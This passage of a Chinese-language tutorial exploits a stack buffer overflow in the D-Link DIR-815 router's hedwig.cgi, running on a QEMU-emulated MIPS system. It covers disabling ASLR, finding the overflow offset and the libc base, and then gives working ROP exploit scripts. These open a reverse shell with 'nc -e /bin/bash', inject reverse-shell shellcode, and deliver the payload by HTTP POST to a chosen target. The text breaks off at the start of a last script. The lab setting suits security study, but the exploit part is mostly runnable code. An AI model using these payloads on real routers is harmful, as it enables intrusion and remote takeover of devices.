+<div class="highlight"><pre><span></span>sudo qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_squeeze_mipsel_standard.qcow2 -append <span class="s2">"root=/dev/sda1 console=tty0"</span> -net nic -net tap -nographic
+</pre></div>
+<p>测试下能ping通的情况下，将文件系统利用scp命令拷贝到mipsel虚拟机中。</p>
+<div class="highlight"><pre><span></span>sudo scp -r squashfs-root root@192.168.79.143:/root/
+</pre></div>
+<p>之后编写copy.sh脚本配置启动http服务需要的环境包括动态链接库，以及conf配置文件中提到的<code>/usr/sbin/phpcgi</code>，<code>/usr/sbin/hnap</code>。</p>
+<p>copy.sh，需要进入squashfs-root目录使用，脚本最后启动了http服务。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+cp conf /
+cp sbin/httpd /
+cp -rf htdocs/ /
+rm /etc/services
+cp -rf etc/ /
+cp lib/ld-uClibc-0.9.30.1.so  /lib/
+cp lib/libcrypt-0.9.30.1.so  /lib/
+cp lib/libc.so.0  /lib/
+cp lib/libgcc_s.so.1  /lib/
+cp lib/ld-uClibc.so.0  /lib/
+cp lib/libcrypt.so.0  /lib/
+cp lib/libgcc_s.so  /lib/
+cp lib/libuClibc-0.9.30.1.so  /lib/
+<span class="nb">cd</span> /
+ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi
+ln -s /htdocs/cgibin /usr/sbin/phpcgi
+ln -s  /htdocs/cgibin /usr/sbin/hnap
+./httpd -f conf
+</pre></div>
+<p>之后可以在浏览器访问conf文件中配置的192.168.79.143:1234/hedwig.cgi</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094338-a529bf7c-a53b-1.png"/></p>
+<p>或者在宿主机中使用以下命令：其中-v显示详细信息，-X指定什么指令，-H 自定义头信息传递给服务器，-b 指定cookie字符串。</p>
+<div class="highlight"><pre><span></span><span class="c1">#curl http://192.168.79.143:1234/hedwig.cgi -v -X POST -H "Content-Length: 8" -b  "uid=zh"</span>
+*   Trying <span class="m">192</span>.168.79.143...
+* Connected to <span class="m">192</span>.168.79.143 <span class="o">(</span><span class="m">192</span>.168.79.143<span class="o">)</span> port <span class="m">1234</span> <span class="o">(</span><span class="c1">#0)</span>
+&gt; POST /hedwig.cgi HTTP/1.1
+&gt; Host: <span class="m">192</span>.168.79.143:1234
+&gt; User-Agent: curl/7.47.0
+&gt; Accept: */*
+&gt; Cookie: <span class="nv">uid</span><span class="o">=</span>zh
+&gt; Content-Length: <span class="m">8</span>
+&gt; 
+&lt; HTTP/1.1 <span class="m">200</span> OK
+&lt; Server: Linux, HTTP/1.1, 
+&lt; Date: Sun, <span class="m">24</span> May <span class="m">2020</span> <span class="m">01</span>:00:46 GMT
+&lt; Transfer-Encoding: chunked
+&lt; Content-Type: text/xml
+&lt; 
+* Connection <span class="c1">#0 to host 192.168.79.143 left intact</span>
+&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;no xml data.&lt;/message&gt;&lt;/hedwig&gt;%
+</pre></div>
+<p>然后在mips虚拟机查看log文件：</p>
+<div class="highlight"><pre><span></span>root@debian-mipsel:~/squashfs-root# cat /log
+Sun May <span class="m">24</span> <span class="m">00</span>:58:11 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> *** Mathopd/1.6b9 starting
+Sun May <span class="m">24</span> <span class="m">00</span>:58:20 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> process_headers: method<span class="o">[</span>GET<span class="o">]</span>, <span class="nv">nheaders</span><span class="o">=[</span><span class="m">6</span><span class="o">]</span>, URL<span class="o">[</span>/<span class="o">]</span>
+Sun May <span class="m">24</span> <span class="m">00</span>:58:43 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> process_headers: method<span class="o">[</span>GET<span class="o">]</span>, <span class="nv">nheaders</span><span class="o">=[</span><span class="m">6</span><span class="o">]</span>, URL<span class="o">[</span>/hedwig.cgi<span class="o">]</span>
+Sun May <span class="m">24</span> <span class="m">00</span>:58:43 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> child process <span class="m">1111</span> exited with status <span class="m">255</span>
+Sun May <span class="m">24</span> <span class="m">00</span>:59:43 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> script timeout to <span class="m">192</span>.168.79.145<span class="o">[</span><span class="m">52472</span><span class="o">]</span>
+Sun May <span class="m">24</span> <span class="m">01</span>:00:46 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> process_headers: method<span class="o">[</span>POST<span class="o">]</span>, <span class="nv">nheaders</span><span class="o">=[</span><span class="m">4</span><span class="o">]</span>, URL<span class="o">[</span>/hedwig.cgi<span class="o">]</span>
+Sun May <span class="m">24</span> <span class="m">01</span>:00:46 <span class="m">2020</span> <span class="o">[</span><span class="m">1109</span><span class="o">]</span> child process <span class="m">1112</span> exited with status <span class="m">255</span>
+</pre></div>
+<p>到这里可以看到我们需要的web服务器以及启动了。</p>
+<h3 data-content="1" id="630c10cf75392550ae94137abfdc59e2">单一程序调试</h3>
+<p>接下来尝试调试<code>/htdocs/web/hedwig.cgi</code>文件</p>
+<div class="highlight"><pre><span></span>root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
+HTTP/1.1 <span class="m">200</span> OK
+Content-Type: text/xml
+
+&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;no REQUEST&lt;/message&gt;&lt;/hedwig&gt;root@debian-mipsel:~/squashfs-root#
+</pre></div>
+<p>返回no REQUEST，查看IDA静态反汇编得知没有指定环境变量<code>REQUEST_METHOD</code>的值。所以想要触发漏洞进行调试的话，还是需要通过export 设置相关环境变量。</p>
+<div class="highlight"><pre><span></span>root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"100"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">"uid=1234"</span>
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi 
+HTTP/1.1 <span class="m">200</span> OK
+Content-Type: text/xml
+<span class="c1">#之前分析过因为没有post数据</span>
+&lt;hedwig&gt;&lt;result&gt;FAILED&lt;/result&gt;&lt;message&gt;no xml data.&lt;/message&gt;&lt;/hedwig&gt;
+root@debian-mipsel:~/squashfs-root#
+</pre></div>
+<p>使用<code>echo 'uid=1234'| /htdocs/web/hedwig.cgi</code>运行成功。</p>
+<div class="highlight"><pre><span></span>root@debian-mipsel:~/squashfs-root# <span class="nb">echo</span> <span class="s1">'uid=1234'</span><span class="p">|</span> /htdocs/web/hedwig.cgi 
+root@debian-mipsel:~/squashfs-root#
+</pre></div>
+<p>接下来动态调试确定偏移但是在那之前需要关掉地址随机化，因为qemu的虚拟机内核开启了地址随机化，每次堆的地址都在变化，导致libc的基地址也不断在变，所以需要关闭地址随机化。</p>
+<p><code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></p>
+<p>可以编写以下脚本进行动态调试</p>
+<p>debug.sh，gdbsever 192.168.79.145是宿主机IP，6666是qemu监听端口。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"100"</span>
+<span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span>
+<span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">"`cat content`"</span>
+<span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span>
+<span class="nb">export</span> <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span>
+<span class="nb">echo</span> <span class="s2">"uid=1234"</span><span class="p">|</span>./gdbserver.mipsel <span class="m">192</span>.168.79.145:6666 /htdocs/web/hedwig.cgi
+</pre></div>
+<p>宿主机gdb调试</p>
+<div class="highlight"><pre><span></span>gdb-multiarch htdocs/cgibin
+<span class="nb">set</span> architecture mips
+target remote <span class="m">192</span>.168.79.143:6666 <span class="c1">#对应qemu地址和端口</span>
+c
+</pre></div>
+<p>得到溢出地址是0x68423668，利用脚本计算偏移为1009</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094338-a59a44d6-a53b-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="c1">#./patternLocOffset.py -s 0x68423668 -l 2000 </span>
+<span class="o">[</span>*<span class="o">]</span> Create pattern string contains <span class="m">2000</span> characters ok!
+<span class="o">[</span>*<span class="o">]</span> No exact matches, looking <span class="k">for</span> likely candidates...
+<span class="o">[</span>+<span class="o">]</span> Possible match at offset <span class="m">1009</span> <span class="o">(</span>adjusted another-endian<span class="o">)</span>
+<span class="o">[</span>+<span class="o">]</span> take time: <span class="m">0</span>.0007 s
+</pre></div>
+<p>接下来是确定libc的基地址，需要先把环境变量配置好，不然/htdocs/web/hedwig.cgi很快就执行完，进程立马就结束了，就得不到maps。</p>
+<p>利用/htdocs/web/hedwig.cgi &amp; cat /proc/pid/maps ，<strong>a&amp;b 先执行a，在执行b，无论a成功与否都会执行b</strong>。因为关闭了地址随机化，libc.so.0的基地址就是0x77f34000。这里的libc.so.0是指向libuClibc-0.9.30.1.so。所以libuClibc-0.9.30.1.so基地址为0x77f34000。</p>
+<div class="highlight"><pre><span></span>root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"100"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">"uid=1234"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span>
+root@debian-mipsel:~/squashfs-root# <span class="nb">export</span> <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span>
+
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi <span class="p">&amp;</span> cat /proc/pid/maps
+<span class="o">[</span><span class="m">10</span><span class="o">]</span> <span class="m">1052</span>
+cat: /proc/pid/maps: No such file or directory
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi <span class="p">&amp;</span> cat /proc/pid/maps
+<span class="o">[</span><span class="m">11</span><span class="o">]</span> <span class="m">1054</span>
+cat: /proc/pid/maps: No such file or directory
+<span class="o">[</span><span class="m">10</span><span class="o">]</span>+  Stopped                 /htdocs/web/hedwig.cgi
+root@debian-mipsel:~/squashfs-root# /htdocs/web/hedwig.cgi <span class="p">&amp;</span> cat /proc/1056/maps 
+<span class="o">[</span><span class="m">12</span><span class="o">]</span> <span class="m">1056</span>
+<span class="m">00400000</span>-0041c000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">32694</span>      /htdocs/cgibin
+0042c000-0042d000 rw-p 0001c000 <span class="m">08</span>:01 <span class="m">32694</span>      /htdocs/cgibin
+0042d000-0042f000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>heap<span class="o">]</span>
+77f34000-77f92000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">547906</span>     /lib/libc.so.0
+77f92000-77fa1000 ---p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+77fa1000-77fa2000 r--p 0005d000 <span class="m">08</span>:01 <span class="m">547906</span>     /lib/libc.so.0
+77fa2000-77fa3000 rw-p 0005e000 <span class="m">08</span>:01 <span class="m">547906</span>     /lib/libc.so.0
+77fa3000-77fa8000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+77fa8000-77fd1000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">546761</span>     /lib/libgcc_s.so.1
+77fd1000-77fe1000 ---p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+77fe1000-77fe2000 rw-p <span class="m">00029000</span> <span class="m">08</span>:01 <span class="m">546761</span>     /lib/libgcc_s.so.1
+77fe2000-77fe7000 r-xp <span class="m">00000000</span> <span class="m">08</span>:01 <span class="m">547907</span>     /lib/ld-uClibc.so.0
+77ff5000-77ff6000 rw-p <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span> 
+77ff6000-77ff7000 r--p <span class="m">00004000</span> <span class="m">08</span>:01 <span class="m">547907</span>     /lib/ld-uClibc.so.0
+77ff7000-77ff8000 rw-p <span class="m">00005000</span> <span class="m">08</span>:01 <span class="m">547907</span>     /lib/ld-uClibc.so.0
+7ffd6000-7fff7000 rwxp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>stack<span class="o">]</span>
+7fff7000-7fff8000 r-xp <span class="m">00000000</span> <span class="m">00</span>:00 <span class="m">0</span>          <span class="o">[</span>vdso<span class="o">]</span>
+
+<span class="o">[</span><span class="m">11</span><span class="o">]</span>+  Stopped                 /htdocs/web/hedwig.cgi
+root@debian-mipsel:~/squashfs-root#
+</pre></div>
+<h3 data-content="1" id="13c13b43ffa7e47bc0f0095040b5eb8d">编写exp</h3>
+<p>上面既然用了两种方法：system和sleep(1)，那么下面也使用这两种。</p>
+<ol>
+<li>
+<p>system方法：将上面的exp的libc基地址和偏移改掉然后cmd换成<code>nc -e /bin/bash 192.168.79.145 9999</code></p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python2</span>
+from pwn import *
+context.endian <span class="o">=</span> <span class="s2">"little"</span>
+context.arch <span class="o">=</span> <span class="s2">"mips"</span>
+<span class="nv">base_addr</span> <span class="o">=</span> 0x77f34000
+<span class="nv">system_addr_1</span> <span class="o">=</span> 0x53200-1
+<span class="nv">gadget1</span> <span class="o">=</span> 0x45988
+<span class="nv">gadget2</span> <span class="o">=</span> 0x159cc
+
+<span class="nv">cmd</span> <span class="o">=</span> <span class="s1">'nc -e /bin/bash 192.168.79.145 9999'</span>
+<span class="nv">padding</span> <span class="o">=</span> <span class="s1">'A'</span> * <span class="m">973</span> <span class="c1">#1009-4*9</span>
+<span class="nv">padding</span> <span class="o">+=</span> p32<span class="o">(</span>base_addr + system_addr_1<span class="o">)</span> <span class="c1"># s0</span>
+<span class="nv">padding</span> <span class="o">+=</span> p32<span class="o">(</span>base_addr + gadget2<span class="o">)</span>       <span class="c1"># s1</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s2</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s3</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s4</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                         <span class="c1"># s5</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s6</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s7</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># fp</span>
+<span class="nv">padding</span> <span class="o">+=</span> p32<span class="o">(</span>base_addr + gadget1<span class="o">)</span>       <span class="c1"># ra</span>
+<span class="nv">padding</span> <span class="o">+=</span> <span class="s1">'B'</span> * 0x10
+<span class="nv">padding</span> <span class="o">+=</span> cmd
+
+<span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">"context"</span>,<span class="s1">'wb'</span><span class="o">)</span>
+f.write<span class="o">(</span>padding<span class="o">)</span>
+f.close<span class="o">()</span>
+</pre></div>
+<p>生成的context通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/bash</span>
+<span class="nb">export</span> <span class="nv">CONTENT_LENGTH</span><span class="o">=</span><span class="s2">"100"</span>
+<span class="nb">export</span> <span class="nv">CONTENT_TYPE</span><span class="o">=</span><span class="s2">"application/x-www-form-urlencoded"</span>
+<span class="nb">export</span> <span class="nv">HTTP_COOKIE</span><span class="o">=</span><span class="s2">"uid=`cat context`"</span>
+<span class="nb">export</span> <span class="nv">REQUEST_METHOD</span><span class="o">=</span><span class="s2">"POST"</span>
+<span class="nb">export</span> <span class="nv">REQUEST_URI</span><span class="o">=</span><span class="s2">"/hedwig.cgi"</span>
+<span class="nb">echo</span> <span class="s2">"uid=1234"</span><span class="p">|</span>/htdocs/web/hedwig.cgi
+<span class="c1">#echo "uid=1234"|./gdbserver.mipsel 192.168.79.145:6666 /htdocs/web/hedwig.cgi</span>
+</pre></div>
+<p>在mips虚拟机运行之后在本机nc -vlp 9999，确实能够获取/bin/bash权限。成功了！说明rop链构造是没问题的。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094339-a6183490-a53b-1.png"/></p>
+</li>
+<li>
+<p>利用sleep(1)调用shellcode</p>
+<p>这里的shllcode作用是给指定的IP地址和端口反弹shell，根据<a href="http://shell-storm.org/shellcode/files/shellcode-860.php" target="_blank">文章</a>修改其中的socket反向连接IP，端口没有改变还是31337。</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python2</span>
+from pwn import *
+context.endian <span class="o">=</span> <span class="s2">"little"</span>
+context.arch <span class="o">=</span> <span class="s2">"mips"</span>
+
+<span class="nv">shellcode</span> <span class="o">=</span> <span class="s2">""</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"</span>
+<span class="c1">#shellcode += "\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"#192.168.1.177:31337</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xf8\xff\xa5\xaf\x4f\x91\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"</span><span class="c1">#192.168.79.145</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"</span>
+<span class="nv">shellcode</span> <span class="o">+=</span> <span class="s2">"\xab\x0f\x02\x24\x0c\x09\x09\x01"</span>
+
+<span class="nv">libc_base</span> <span class="o">=</span> 0x77f34000
+<span class="nv">sleep</span> <span class="o">=</span> 0x56BD0 <span class="c1">#sleep jr ra 0x7678edf4</span>
+<span class="nv">gadget1</span> <span class="o">=</span> 0x57E50
+<span class="nv">gadget2</span> <span class="o">=</span> 0x3B8A8
+<span class="nv">gadget3</span> <span class="o">=</span> 0x14F28
+<span class="nv">gadget4</span> <span class="o">=</span> 0x1DD08#0x15C84#0xBB44
+
+<span class="nv">payload</span> <span class="o">=</span> <span class="s1">'A'</span> * <span class="m">973</span> <span class="c1">#1009-9*4</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                         <span class="c1"># s0</span>
+<span class="nv">payload</span> <span class="o">+=</span> p32<span class="o">(</span>libc_base + gadget2<span class="o">)</span>       <span class="c1"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
+<span class="nv">payload</span> <span class="o">+=</span> p32<span class="o">(</span>libc_base + sleep<span class="o">)</span>         <span class="c1"># s2 = jr $(sp+0x24)</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s3</span>
+<span class="nv">payload</span> <span class="o">+=</span> p32<span class="o">(</span>libc_base + gadget4<span class="o">)</span>       <span class="c1"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                         <span class="c1"># s5</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s6</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># s7</span>
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> * <span class="m">4</span>                        <span class="c1"># fp</span>
+<span class="nv">payload</span> <span class="o">+=</span> p32<span class="o">(</span>libc_base + gadget1<span class="o">)</span>       <span class="c1"># ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
+
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'B'</span> * 0x24 <span class="c1"># mipsrop.tail() 0x24B padding</span>
+<span class="nv">payload</span> <span class="o">+=</span> p32<span class="o">(</span>libc_base + gadget3<span class="o">)</span>       <span class="c1"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>
+
+<span class="nv">payload</span> <span class="o">+=</span> <span class="s1">'c'</span> * 0x18 <span class="c1"># mipsrop.stackfinder() 0x18B padding</span>
+<span class="nv">payload</span> <span class="o">+=</span> shellcode
+
+<span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span><span class="s2">"exploit2"</span>,<span class="s1">'wb+'</span><span class="o">)</span>
+f.write<span class="o">(</span>payload<span class="o">)</span>
+f.close<span class="o">()</span>
+</pre></div>
+<p>生成的exploit2通过scp拷贝到mips虚拟机中并且<code>nano debug.sh</code>更改debug.sh运行得到shell。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094340-a681a86c-a53b-1.png"/></p>
+</li>
+</ol>
+<h2 data-content="1" id="384c94aa3eee495dc78c5bc3033b7a5a">利用HTTP报文获取shell</h2>
+<p>其实现在mips虚拟机相当于一个开启了部分web服务的DIR815路由器，我们可以通过发送http报文获取shell。</p>
+<p>利用system函数</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s2">"little"</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"mips"</span>
+
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">def</span> <span class="nf">get_payload</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">libc_base</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+    <span class="n">gadget1</span> <span class="o">=</span> <span class="mh">0x45988</span>
+    <span class="n">gadget2</span> <span class="o">=</span> <span class="mh">0x159cc</span>
+    <span class="n">system_addr_1</span> <span class="o">=</span> <span class="mh">0x53200</span><span class="o">-</span><span class="mi">1</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="n">offset</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">system_addr_1</span><span class="p">)</span> <span class="c1"># s0</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># s1</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s2</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s3</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s4</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s5</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s6</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s7</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># fp</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span>       <span class="c1"># ra</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s1">'B'</span> <span class="o">*</span> <span class="mh">0x10</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">cmd</span>
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">if</span> <span class="vm">__name__</span><span class="o">==</span><span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">"nc -e /bin/bash 192.168.79.145 9999"</span>
+    <span class="n">cookie</span><span class="o">=</span><span class="s1">'uid='</span> <span class="o">+</span> <span class="n">get_payload</span><span class="p">(</span><span class="mi">973</span><span class="p">,</span> <span class="mh">0x77f34000</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="n">header</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s1">'Cookie'</span>        <span class="p">:</span> <span class="n">cookie</span><span class="p">,</span>
+        <span class="s1">'Content-Type'</span>  <span class="p">:</span> <span class="s1">'application/x-www-form-urlencoded'</span><span class="p">,</span>
+        <span class="s1">'Content-Length'</span><span class="p">:</span> <span class="s1">'100'</span>
+        <span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">'uid'</span><span class="p">:</span><span class="s1">'1234'</span><span class="p">}</span>
+    <span class="n">ip_port</span><span class="o">=</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">url</span><span class="o">=</span><span class="s2">"http://"</span><span class="o">+</span><span class="n">ip_port</span><span class="o">+</span><span class="s2">"/hedwig.cgi"</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
+</pre></div>
+<p>测试结果：获取shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094341-a70084fc-a53b-1.png"/></p>
+<p>利用sleep调用shellcode(反弹shell)</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
